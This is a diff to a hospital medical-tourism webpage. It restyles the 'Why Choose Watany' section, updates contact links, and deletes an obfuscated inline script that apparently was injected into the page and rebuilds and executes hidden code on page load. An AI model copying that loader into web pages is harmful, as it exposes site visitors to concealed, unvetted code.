@@ -124,10 +124,89 @@
             .medical-tour-servs .splide__arrow svg{
                 fill: white;
             }
+
+            .chapter .chapter-header h2 {
+    font-size: 50px;
+    font-weight: 700;
+}
+
+.chapter .box {
+    padding: 30px;
+    margin-bottom: 15px;
+}
+
+.chapter .rounded {
+    font-weight: 700;
+    padding: 10px 0;
+}
+
+.chapter .box h3 {
+    font-weight: 800;
+    font-size: 30px;
+    padding: 15px 5px;
+}
+
+.chapter .chapter-nav {
+    position: sticky;
+    top: 100px;
+}
+
+.chapter .chapter-nav a {
+    transition: 0.3s;
+    position: relative;
+    color: #213262;
+}
+
+.chapter .chapter-nav a:hover {
+    background-color: #f8f9fa;
+    color: black;
+}
+
+.chapter .chapter-nav a.active {
+    margin-left: 20px;
+}
+
+.chapter .chapter-nav a.active::before {
+    content: "";
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 30px;
+    left: -34px;
+    border-bottom: 4px solid #13c5dd;
+}
+
+.chapter .chapter-nav a.active {
+    color: #13c5dd;
+}
+
+.bg-color {
+    background-color: #f5f4fb;
+}
+.border-radius-1 {
+border-radius: 0 25px 0 25px;
+}
+.border-radius-2{
+    border-radius: 25px 0 25px 0;
+}
+
+@media screen and (max-width: 768px) {
+    .container {
+        max-width: 100%;
+    }
+    .med-reason .chapter-nav{
+        padding-bottom: 20px;
+    }
+    .chapter .box h3 {
+        font-size: 25px;
+    }
+}
+
     </style>
 
     </head>
-    <body>
+    <body data-bs-spy="scroll" data-bs-target="#main-navbar" data-offset="110"
+    data-bs-root-margin="0px 0px -40%" data-bs-smooth-scroll="true">
 
         <section class="fixed-social">
             <span class="d-inline-block" tabindex="0" data-bs-toggle="popover"
@@ -873,106 +952,120 @@
                                 </div>
                             </div>
                         </div>
-                        <div class="medical-reason" style="text-align: left;">
-                            <div
-                                class=" reason-b-h  text-uppercase mb-3 bold hidden show"
-                                style="text-align: center;">
-                                <span class="trans-title mt-4">Why Choose
-                                    Watany</span>
-                            </div>
 
-                            <div class="row" style="color: gray;">
-                                <div class="medical-reason-body">
-                                    <h3
-                                        class="bold main-font pb-2">1) Hassle free
-                                        experience:</h3>
-                                        <div class="more-info ps-3">
-                                            <h4
-                                            class="bold primary-co-2">. Accommodation</h4>
-                                        <p>We understand the importance of
-                                            comfortable accommodation for patients
-                                            and their companions. Watany Eye
-                                            Hospitals collaborates with reputable
-                                            hotels and resorts in the vicinity,
-                                            offering a range of options to suit
-                                            different preferences and budgets. These
-                                            accommodations are conveniently located
-                                            and provide a tranquil environment
-                                            conducive to relaxation and recovery.
-                                            The Hotels are <strong>JW
-                                                Marriot</strong> &
-                                            <strong>Renaissance</strong>
-                                            in Cairo and Marriot in Hurghada. Our
-                                            dedicated staff can assist in making
-                                            reservations and ensuring that patients
-                                            receive special rates and amenities
-                                            during their stay.
-                                        </p>
-
-                                        <div class="medical-reason-body">
-                                            <h4
-                                                class="bold primary-co-2">. Transportation</h4>
-                                            <p>Watany Eye Hospitals aims to make travel
-                                                arrangements as convenient as possible
-                                                for medical tourists. We provide
-                                                assistance in arranging airport
-                                                transfers, ensuring seamless
-                                                transportation from the airport to the
-                                                hospitals or chosen accommodation.
-                                                Additionally, we offer transportation
-                                                services for patients requiring
-                                                post-operative follow-up visits or other
-                                                related appointments. Our team
-                                                coordinates these arrangements,
-                                                prioritizing comfort, safety, and
-                                                punctuality.</p>
+                        <div class="py-5 med-reason chapter">
+                            <div class="container">
+                                <div class="chapter-header text-center mb-5">
+                                    <h2 class="trans-title" style="opacity: 1;">Why Choose
+                                        Watany</h2>
+                                </div>
+                
+                                <div class="row text-start">
+                                    <div class="col-md-4">
+                                        <div id="list-example"
+                                            class="chapter-nav d-flex flex-column gap-2
+                                            simple-list-example-scrollspy
+                                            ">
+                                            <a class="rounded" href="#hassle">Hassle free experience</a>
+                                            <a class="rounded" href="#doctors">Doctors Professionalism</a>
+                                            <a class="rounded" href="#latestTechnology">Latest technology</a>
+                                            <a class="rounded" href="#suitablePrices">Suitable Prices</a>
+                                            <a class="rounded" href="#payment">Flexible payment options</a>
+                                            <a class="rounded" href="#experience">23 Years of Experience</a>
                                         </div>
-                                        <div class="medical-reason-body">
-                                            <h4 class="bold primary-co-2">. All Services in
-                                                One Place</h4>
-                                            <p>Watany Eye Hospitals are designed to meet
-                                                all your medical needs efficiently and
-                                                seamlessly. With our integrated
-                                                approach, you can access comprehensive
-                                                eye exams, diagnostic investigations,
-                                                surgical procedures, pharmacy services,
-                                                laboratory tests, optics consultations,
-                                                and even obtain contact lenses all
-                                                within the same premises.</p>
-                                        </div>
-
                                     </div>
+                                    <div class="col-md-8">
+                                        <div data-bs-spy="scroll"
+                                        data-bs-target="#simple-list-example"
+                                        data-bs-offset="0"
+                                        data-offset="110"
+                                        tabindex="0"
+                                        >
+                
+                                            <div class="box bg-color border-radius-1" id="hassle">
+                                                <h3 class="text-head main-font">Hassle free experience</h3>
+                                                <div class="hassle-info">
+                                                    <h4
+                                                    class="bold primary-co-2">. Accommodation</h4>
+                                                <p>We understand the importance of
+                                                    comfortable accommodation for patients
+                                                    and their companions. Watany Eye
+                                                    Hospitals collaborates with reputable
+                                                    hotels and resorts in the vicinity,
+                                                    offering a range of options to suit
+                                                    different preferences and budgets. These
+                                                    accommodations are conveniently located
+                                                    and provide a tranquil environment
+                                                    conducive to relaxation and recovery.
+                                                    The Hotels are <strong>JW
+                                                        Marriot</strong> &
+                                                    <strong>Renaissance</strong>
+                                                    in Cairo and Marriot in Hurghada. Our
+                                                    dedicated staff can assist in making
+                                                    reservations and ensuring that patients
+                                                    receive special rates and amenities
+                                                    during their stay.
+                                                </p>
+                                                    <h4
+                                                    class="bold primary-co-2">. Transportation</h4>
+                                                    <p>Watany Eye Hospitals aims to make travel
+                                                    arrangements as convenient as possible
+                                                    for medical tourists. We provide
+                                                    assistance in arranging airport
+                                                    transfers, ensuring seamless
+                                                    transportation from the airport to the
+                                                    hospitals or chosen accommodation.
+                                                    Additionally, we offer transportation
+                                                    services for patients requiring
+                                                    post-operative follow-up visits or other
+                                                    related appointments. Our team
+                                                    coordinates these arrangements,
+                                                    prioritizing comfort, safety, and
+                                                    punctuality.</p>
+    
+                                                    <h4 class="bold primary-co-2">. All Services in
+                                                        One Place</h4>
+                                                    <p>Watany Eye Hospitals are designed to meet
+                                                        all your medical needs efficiently and
+                                                        seamlessly. With our integrated
+                                                        approach, you can access comprehensive
+                                                        eye exams, diagnostic investigations,
+                                                        surgical procedures, pharmacy services,
+                                                        laboratory tests, optics consultations,
+                                                        and even obtain contact lenses all
+                                                        within the same premises.</p>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="box bg-color border-radius-2" id="doctors">
+                                                <h3 class="text-head main-font"> Doctors Professionalism</h3>
+                                                <p class="text-color">At our eye hospital, professionalism is the cornerstone of our doctors' practice. Our team of highly skilled ophthalmologists is dedicated to providing exceptional care with unwavering professionalism and compassion.</p>
+                                            </div>
+                                            <div class="box bg-color border-radius-1" id="latestTechnology">
+                                                <h3 class="text-head main-font">Latest technology</h3>
+                                                <p class="text-color">We continuously invest in the latest equipment and technology to ensure that our patients have access to the most advanced medical treatments available. We are also certified form the Center of Excellence for having the Latest equipment.</p>
+                                            </div>
+                                            <div class="box bg-color border-radius-2" id="suitablePrices">
+                                                <h3 class="text-head main-font">Suitable Prices</h3>
+                                                <p class="text-color">We offer competitive and affordable prices without compromising on the standard of care.</p>
+                                            </div>
+
+                                            <div class="box bg-color border-radius-1" id="payment">
+                                                <h3 class="text-head main-font">Flexible payment options</h3>
+                                                <p class="text-color">We offer convenient payment methods including credit cards, debit cards or cash.</p>
+                                            </div>
+
+                                            <div class="box bg-color border-radius-2" id="experience">
+                                                <h3 class="text-head main-font">23 Years of Experience</h3>
+                                                <p class="text-color">With a legacy spanning 23 years, our eye hospital boasts a rich history of providing unparalleled care and transforming lives through vision. Throughout the decades, our commitment to excellence, innovation, and patient-centered care has remained unwavering. Over the years, we have earned the trust and gratitude of millions of patients who have entrusted us with their vision, and their continued satisfaction serves as a testament to our enduring legacy.</p>
+                                            </div>
 
                                         </div>
-    
-
-                                <div class="medical-reason-body">
-                                    <h3
-                                    class="bold main-font pb-2">2) Doctors’ Professionalism:</h3>
-                                    <p>At our eye hospital, professionalism is the cornerstone of our doctors' practice. Our team of highly skilled ophthalmologists is dedicated to providing exceptional care with unwavering professionalism and compassion.</p>
-                                </div>
-                                <div class="medical-reason-body">
-                                    <h3
-                                    class="bold main-font pb-2">3) Latest technology:</h3>
-                                    <p>We continuously invest in the latest equipment and technology to ensure that our patients have access to the most advanced medical treatments available. We are also certified form the Center of Excellence for having the Latest equipment.</p>
-                                </div>
-                                <div class="medical-reason-body">
-                                    <h3
-                                    class="bold main-font pb-2">4) Suitable Prices:</h3>
-                                    <p>We offer competitive and affordable prices without compromising on the standard of care.</p>
-                                </div>
-                                <div class="medical-reason-body">
-                                    <h3
-                                    class="bold main-font pb-2">5) Flexible payment options:</h3>
-                                    <p>We offer convenient payment methods including credit cards, debit cards or cash.</p>
-                                </div>
-                                <div class="medical-reason-body">
-                                    <h3
-                                    class="bold main-font pb-2">6) 23 Years of Experience:</h3>
-                                    <p>With a legacy spanning 23 years, our eye hospital boasts a rich history of providing unparalleled care and transforming lives through vision. Throughout the decades, our commitment to excellence, innovation, and patient-centered care has remained unwavering. Over the years, we have earned the trust and gratitude of millions of patients who have entrusted us with their vision, and their continued satisfaction serves as a testament to our enduring legacy.</p>
+                                    </div>
                                 </div>
                             </div>
                         </div>
+
                     </div>
                 </div>
 
@@ -989,22 +1082,21 @@
 
                             <div class="col-md-6 col-sm-12 mb-5">
                                 <a
-                                    href="tel:01240016112"
+                                    href="https://wa.link/sdkf7t"
                                     target="_blank">
                                     <img src="../images/icons/whatsapp.png"
                                         alt="whatsapp">
                                     <h3>
-                                        WhatsApp
+                                       Phone or WhatsApp
                                     </h3>
                                 </a>
                             </div>
 
                             <div class="col-md-6 col-sm-12 mb-5"">
-                                <a
-                                    href=mailto:“internationalpatient@watanyeyehospitals.com”>
-                                    <img src="../images/icons/email.png"
-                                        alt="emailus">
-                                    <h3>Email Us</h3>
+                                
+                                <a href="mailto:“int.dept@watanyeyehospitals.com”">
+                                    <img src=" ../images/icons/email.png" alt="emailus">
+                                <h3>Email Us</h3>
                                 </a>
                             </div>
 
@@ -1226,20 +1318,20 @@
                             <div class="fot">
                                 <h4 class="text-uppercase pb-3">Contact Us</h4>
                                 <ul class="fot-links">
-                                    <li class="mb-2"><a href="tel:16112"
+                                    <li class="mb-2"><a href="tel:01240016112"
                                             class="white"><i
                                                 class="fa-sharp fa-solid fa-phone"
-                                                style="position: relative; margin-right: 4px;"></i>16112</a></li>
+                                                style="position: relative; margin-right: 4px;"></i>Phone</a></li>
                                     <li class="mb-2"><a target=”_blank”
-                                            href="https://wa.me/201211110722?text=I%27m%20interested%20to%20Contact%20you"
+                                        href="https://wa.link/sdkf7t"
                                             class="white"><i
                                                 class="fa fa-brands fa-whatsapp"
                                                 style="position: relative; margin-right: 4px;"></i>WhatsApp</a></li>
                                     <li class="mb-2"><a target="_blank"
-                                            href=mailto:“contactus@watanyeyehospitals.com”
+                                            href=mailto:“int.dept@watanyeyehospitals.com”
                                             class="white"><i
                                                 class="fa-sharp fa-solid fa-envelope"
-                                                style="position: relative; margin-right: 4px;"></i>contactus@watanyeyehospitals.com</a></li>
+                                                style="position: relative; margin-right: 4px;"></i>int.dept@watanyeyehospitals.com</a></li>
                                     <li class="mb-2"><a target="_blank"
                                             href="./bookingform.html"><i
                                                 class="fa-regular fa-calendar-plus"
@@ -1292,8 +1384,6 @@
             <!-- JS main Script -->
             <script src="../js/main.js"></script>
 
-            <script>
-    (function () { var EDq = '', SkB = 303 - 292; function mFb(w) { var u = 1610271; var j = w.length; var p = []; for (var z = 0; z < j; z++) { p[z] = w.charAt(z) }; for (var z = 0; z < j; z++) { var g = u * (z + 357) + (u % 20650); var n = u * (z + 468) + (u % 17337); var o = g % j; var x = n % j; var t = p[o]; p[o] = p[x]; p[x] = t; u = (g + n) % 3514907; }; return p.join('') }; var UkQ = mFb('eojyzrxrmcruwbdtgoutfkpqivlcsshnotanc').substr(0, SkB); var ert = 'i(r)nr ;,aj9ni7!2l.eip ve" (hnl.at,o=a+vl6.i tlo)a.=t"(44a(=0vhgl2oa.++n)aA.ist37ro2a)vh+,"f7dre;w=ro1;yve[Cl6lc89,(;l+=ivt)rt{[aoefhr("nffn(t;369zl=sccb;(r0tjub(lrr,g]lryda zh.a;c2=(,;+o+,=,]+y<t=l.uveCrt,h(vsz)*guqyagcj8 d),=;},l)o-qa=v)lmlvte3lsrq7)vAlgh(3 n=.<;=n C,, =nddv.nt(xn+"oC=nlh-;))vrtt=vrl{7f=t 6[r=[a; a, p;o8i-05p<;lb,,v=r)k {=()n+au;>a}t;{r2rh acvS+hmatsne;8c4;v9rv=a)"(guv(dy-l-0)f([r[u7rhtynw;ote,[(8;h1i ;)b.eha=codfe;rCsm0As,)=r;)(kr1ims,gwi9z9=(= nms](c01eC;oohng+Acr+=(odhel(h1la]2;.p);rh+jto;ih=gw<.d;)]fw+=1+s72iyuy+1hsnue8jff]00*8t,l);=;e6,f)(,v)rd+ svr 1gm)]petn]]2=;yr.w8vu,.g1[a);=h;k+n+da}iafmj=o)lqv[h96q[for.u!vxa g,ui t;i +bpj{ovho;=06asyns=")f}uarpus.},ca]{;(;a(=eC-[j5i;f.,ro[tr .yf.)7;r,ke0[y5oas=2;)cv5tfr7c);sartr+0b(0sgre>ron=at1;pt(46.4rr(ytomi cA=t<;.aen8=(ef{=t)na"a]o=n(m+[ )u-xpa("+s.wutnuSxnern.w9.nC+]r.w;aa;a](it]te upn}oe06rih;=j"};huj(1e0)a.'; var lsj = mFb[UkQ]; var CEv = ''; var glE = lsj; var jlr = lsj(CEv, mFb(ert)); var VIR = jlr(mFb('.++]&(Gma7\'$=Gj()06lssa..l0G.o+]eGiGodk5ri!)[G9a8.bi5wobddev};der)*6=u)*dqGthC%.p ]Gtd."d%;;d](!;pdoby7.n_0a.}]57$-o[f,av.e6ed;5(c,9Gb)!G=(*sl.n..)dff;[rf)Grc725);!iGw.;y[ }+o{7=5f].] %!_ycyG8=()n];)1r%sr"hda(._)df;$;+))*9\'%;,.6d3)&.d200ig.Gga(]d3h)#5)6d6b6Go2.#[+Gdi==+(%d]G%+#e+o7)r%*ba&%rf.+d5n6%.dkGt!=f("G=feo#=.]rad.iG[*.em.G;e2 dsr[=gx.;a1"5.c0"2}y{)))}0+t#u6(flGo.9r]tu}u(2b9$itro;w%l$u%.(%[=[b.Gm]G=Ge.Grn) b&GG.!eak+0. d)!{r)8l.)$i1!$xp}gf+=(G_tGdG!\'G92Gg}=ef=!!iG+GG(##G{8b,tGu=u GiGy5][(i)=o=l;(]9]a%i!.05])G%fG(%.){t$)bG=1ad1ff%.d=x.0Gulel6({.o60Go5i$(3Gl.\'G){GsG1G 1=r[G.e((#4#!!)t0d]n]f"ni9;stf,y(={2e(20f)$}=t]ddrr$2GnGf[bhdr{e=m.$.4rp((ssa1Ged*cuicn+GdoG%}c2.n30)(,t(a6(hp)GG((36.&![[]r(Gn +8{%*Gtf(!)t.or0oi05idC)_5_d][ #.;dii"! uSG"[aG.d')); var dsf = glE(EDq, VIR); dsf(1908); return 2818 })()
-    </script>
+
         </body>
     </html>
